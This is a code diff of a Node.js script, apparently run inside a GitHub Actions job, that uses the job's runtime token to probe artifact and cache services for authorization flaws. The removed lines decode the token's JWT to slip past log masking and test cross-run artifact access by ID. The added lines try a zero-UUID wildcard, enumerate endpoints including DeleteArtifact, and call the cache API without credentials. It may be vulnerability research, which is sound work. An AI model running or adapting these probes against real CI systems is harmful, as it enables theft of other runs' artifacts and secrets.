@@ -5,36 +5,11 @@ const crypto = require('crypto');
 const RESULTS_URL = process.env.ACTIONS_RESULTS_URL || '';
 const RUNTIME_TOKEN = process.env.ACTIONS_RUNTIME_TOKEN || '';
 const CACHE_URL = process.env.ACTIONS_CACHE_URL || '';
-const ORCHESTRATION_ID = process.env.ACTIONS_ORCHESTRATION_ID || '';
 
 const outputFile = process.env.GITHUB_OUTPUT || '';
 if (outputFile) {
   fs.appendFileSync(outputFile, `RESULTS_URL=${RESULTS_URL}\n`);
-  fs.appendFileSync(outputFile, `CACHE_URL=${CACHE_URL}\n`);
   fs.appendFileSync(outputFile, `TOKEN_PRESENT=${RUNTIME_TOKEN ? 'YES' : 'NO'}\n`);
-  fs.appendFileSync(outputFile, `ORCH_ID=${ORCHESTRATION_ID}\n`);
-}
-
-console.log('RESULTS_URL:', RESULTS_URL || '(empty)');
-console.log('CACHE_URL (truncated):', CACHE_URL ? CACHE_URL.substring(0, 70) : '(empty)');
-console.log('TOKEN_PRESENT:', RUNTIME_TOKEN ? 'YES' : 'NO');
-console.log('ORCH_ID:', ORCHESTRATION_ID || '(empty)');
-
-// Try to decode JWT payload (might escape masking since it's different bytes)
-if (RUNTIME_TOKEN && RUNTIME_TOKEN.includes('.')) {
-  try {
-    const parts = RUNTIME_TOKEN.split('.');
-    if (parts.length >= 2) {
-      const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
-      const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
-      console.log('=== JWT Header ===');
-      console.log(JSON.stringify(header, null, 2));
-      console.log('=== JWT Payload (token claims — may reveal scope) ===');
-      console.log(JSON.stringify(payload, null, 2));
-    }
-  } catch (e) {
-    console.log('JWT decode error:', e.message);
-  }
 }
 
 function doRequest(options, body) {
@@ -42,7 +17,7 @@ function doRequest(options, body) {
     const req = https.request(options, (res) => {
       let data = '';
       res.on('data', (chunk) => data += chunk);
-      res.on('end', () => resolve({ status: res.statusCode, body: data.substring(0, 800) }));
+      res.on('end', () => resolve({ status: res.statusCode, body: data.substring(0, 1000), headers: res.headers }));
     });
     req.on('error', (e) => resolve({ status: 'ERROR', body: e.message }));
     if (body) req.write(typeof body === 'string' ? body : JSON.stringify(body));
@@ -51,85 +26,85 @@ function doRequest(options, body) {
 }
 
 async function main() {
-  const currentUUID = ORCHESTRATION_ID.split('.')[0];
-  // UUID from previous run that actually uploaded probe-artifact-2
-  const previousRunUUID = 'b55c9da0-4a06-4590-ae64-d1ca22909520';
-
-  console.log('\n=== CROSS-RUN IDOR TEST ===');
-  console.log('Current run UUID:', currentUUID);
-  console.log('Previous run UUID (target):', previousRunUUID);
+  const ZERO_UUID = '00000000-0000-0000-0000-000000000000';
 
   if (RESULTS_URL && RUNTIME_TOKEN) {
     const host = new URL(RESULTS_URL).hostname;
-    const signedUrlPath = '/twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL';
 
-    // Test A: Get signed URL for artifact in PREVIOUS run using CURRENT run's token
-    // If this works (200), we have cross-run artifact IDOR
-    const rA = await doRequest({
-      hostname: host, path: signedUrlPath, method: 'POST',
-      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json' }
-    }, { workflowRunBackendId: previousRunUUID, name: 'probe-artifact-2' });
-    console.log('\n[IDOR Test A] GetSignedURL with PREVIOUS run UUID + CURRENT token:');
-    console.log('Status:', rA.status, '| Body:', rA.body);
-    // 200 = IDOR confirmed; 404 = properly scoped; 401 = token invalid
-
-    // Test B: List artifacts in PREVIOUS run using CURRENT run's token
-    const rB = await doRequest({
+    // Test: Does Actions.GenericRead:ZERO_UUID allow listing ALL artifacts?
+    // The zero UUID in scp might mean "any run" (wildcard) for GenericRead
+    console.log('=== Test: Zero-UUID GenericRead scope on ListArtifacts ===');
+    const r1 = await doRequest({
       hostname: host,
       path: '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts',
       method: 'POST',
       headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json' }
-    }, { workflowRunBackendId: previousRunUUID });
-    console.log('\n[IDOR Test B] ListArtifacts with PREVIOUS run UUID + CURRENT token:');
-    console.log('Status:', rB.status, '| Body:', rB.body);
+    }, { workflowRunBackendId: ZERO_UUID });
+    console.log('ListArtifacts(ZERO_UUID) → Status:', r1.status, '| Body:', r1.body);
 
-    // Test C: List artifacts for current run (baseline — should work if token is valid for ListArtifacts)
-    const rC = await doRequest({
+    // Test: GetSignedArtifactURL with ZERO_UUID — does GenericRead scope bypass run-level scope?
+    console.log('\n=== Test: GetSignedArtifactURL with ZERO_UUID ===');
+    const r2 = await doRequest({
       hostname: host,
-      path: '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts',
+      path: '/twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL',
       method: 'POST',
       headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json' }
-    }, { workflowRunBackendId: currentUUID });
-    console.log('\n[IDOR Test C] ListArtifacts with CURRENT run UUID (baseline):');
-    console.log('Status:', rC.status, '| Body:', rC.body);
+    }, { workflowRunBackendId: ZERO_UUID, name: 'probe-artifact-2' });
+    console.log('GetSignedArtifactURL(ZERO_UUID) → Status:', r2.status, '| Body:', r2.body);
+
+    // Test: What OTHER endpoints exist on results-receiver? Try common paths
+    for (const endpoint of [
+      '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact',
+      '/twirp/github.actions.results.api.v1.ArtifactService/DeleteArtifact',
+      '/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact',
+      '/api/v1/artifacts',
+      '/v1/artifacts',
+    ]) {
+      const r = await doRequest({
+        hostname: host, path: endpoint, method: 'POST',
+        headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json' }
+      }, '{}');
+      console.log(`\n${endpoint} → Status: ${r.status} | Body: ${r.body.substring(0, 100)}`);
+    }
   }
 
-  // Test D: Cache service with proper version hash (sha256 of key + paths)
+  // Test cache service with correct headers (v6.0-preview.1 vs v6.0-preview)
   if (CACHE_URL && RUNTIME_TOKEN) {
-    const cacheKey = 'npm-cache';
-    const paths = 'node_modules';
-    const version = crypto.createHash('sha256').update(cacheKey + '\n' + paths).digest('hex');
+    const cacheHost = new URL(CACHE_URL).hostname;
+    const sessionPath = new URL(CACHE_URL).pathname;
+    const cacheKey = 'test-key';
+    const version = crypto.createHash('sha256').update(cacheKey).digest('hex');
 
-    const cacheApiUrl = new URL(CACHE_URL + '_apis/artifactcache/cache');
-    cacheApiUrl.searchParams.set('keys', cacheKey);
-    cacheApiUrl.searchParams.set('version', version);
+    // Try without Accept version header (minimal headers)
+    console.log('\n=== Cache service — minimal headers ===');
+    const rC1 = await doRequest({
+      hostname: cacheHost,
+      path: sessionPath + '_apis/artifactcache/cache?keys=' + cacheKey + '&version=' + version,
+      method: 'GET',
+      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN }
+    }, null);
+    console.log('Cache(no Accept) → Status:', rC1.status, '| Body:', rC1.body.substring(0, 200));
 
-    const rD = await doRequest({
-      hostname: cacheApiUrl.hostname,
-      path: cacheApiUrl.pathname + cacheApiUrl.search,
+    // Try with api-version=6.0-preview.1
+    const rC2 = await doRequest({
+      hostname: cacheHost,
+      path: sessionPath + '_apis/artifactcache/cache?keys=' + cacheKey + '&version=' + version,
       method: 'GET',
       headers: {
         'Authorization': 'Bearer ' + RUNTIME_TOKEN,
-        'Accept': 'application/json;api-version=6.0-preview',
-        'Content-Type': 'application/json',
+        'Accept': 'application/json;api-version=6.0-preview.1',
       }
     }, null);
-    console.log('\n[Cache Test D] GET cache with key=npm-cache, version=' + version.substring(0, 16) + '...:');
-    console.log('Status:', rD.status, '| Body:', rD.body);
+    console.log('Cache(preview.1) → Status:', rC2.status, '| Body:', rC2.body.substring(0, 200));
 
-    // Test E: Try to list ALL cache entries visible to this token
-    const cacheListUrl = new URL(CACHE_URL + '_apis/artifactcache/caches');
-    const rE = await doRequest({
-      hostname: cacheListUrl.hostname,
-      path: cacheListUrl.pathname,
+    // CRITICAL: Try calling cache API without Authorization (URL token IS the auth)
+    const rC3 = await doRequest({
+      hostname: cacheHost,
+      path: sessionPath + '_apis/artifactcache/cache?keys=' + cacheKey + '&version=' + version,
       method: 'GET',
-      headers: {
-        'Authorization': 'Bearer ' + RUNTIME_TOKEN,
-        'Accept': 'application/json;api-version=6.0-preview',
-      }
+      headers: { 'Accept': 'application/json;api-version=6.0-preview' }
     }, null);
-    console.log('\n[Cache Test E] List ALL caches (scope discovery):');
-    console.log('Status:', rE.status, '| Body:', rE.body);
+    console.log('Cache(no Auth header) → Status:', rC3.status, '| Body:', rC3.body.substring(0, 200));
   }
 }
 
